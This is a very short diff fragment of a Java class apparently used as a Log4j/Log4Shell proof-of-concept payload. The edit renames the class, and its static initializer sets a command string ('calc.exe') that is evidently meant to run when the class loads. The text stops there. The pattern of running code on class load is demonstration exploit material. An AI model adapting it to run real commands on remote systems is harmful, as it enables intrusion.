@@ -1,4 +1,4 @@
-public class Log4j {
+public class Log4J {
     static {
         try {
             String cmd = "calc.exe";
